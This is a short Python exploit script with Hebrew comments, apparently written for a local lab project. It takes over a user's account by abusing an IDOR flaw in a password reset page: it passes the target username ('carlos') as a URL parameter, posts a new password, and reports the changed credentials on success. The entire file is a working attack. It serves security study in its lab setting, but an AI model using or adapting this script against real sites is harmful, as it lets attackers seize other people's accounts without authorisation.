import requests

# --- הגדרות היעד ---
# שימי לב: אם האתר שלך רץ בכתובת אחרת, תשני כאן
BASE_URL = "http://localhost/CyberProject/" 
TARGET_FILE = "reset_password.php"
RESET_URL = BASE_URL + TARGET_FILE

# המשתמש שאנחנו רוצים "לגנוב" והסיסמה החדשה שנחליט עבורו
TARGET_USER = "carlos"
NEW_PASSWORD = "1234"

def run_exploit():
    print(f"[*] Initializing Account Takeover attack via Broken Password Reset...")
    print(f"[*] Target User: {TARGET_USER}")
    print(f"[*] Target URL: {RESET_URL}")
    
    # שלב 1: הזרקת הפרמטר ב-URL (ה-IDOR)
    # אנחנו שולחים את שם המשתמש ב-GET למרות שזה דף איפוס
    params = {
        'user': TARGET_USER
    }
    
    # שלב 2: שליחת הסיסמה החדשה בתוך ה-Body של הבקשה (POST)
    data = {
        'new_password': NEW_PASSWORD
    }
    
    print(f"[*] Sending malicious request to bypass authentication...")
    
    try:
        # ביצוע הבקשה
        response = requests.post(RESET_URL, params=params, data=data)
        
        # בדיקה אם התקיפה הצליחה לפי התוכן שחוזר מהשרת
        if response.status_code == 200 and f"The password for <strong>{TARGET_USER}</strong>" in response.text:
            print("\n" + "="*40)
            print("[!!!] ATTACK SUCCESSFUL [!!!]")
            print(f"[+] Password for '{TARGET_USER}' has been changed.")
            print(f"[+] New Credentials: {TARGET_USER} / {NEW_PASSWORD}")
            print("="*40)
        else:
            print("\n[-] Attack failed. Server response did not indicate a successful reset.")
            print("[?] Check if the user exists in the database or if the URL is correct.")
            
    except Exception as e:
        print(f"\n[!] Error connecting to server: {e}")

if __name__ == "__main__":
    run_exploit()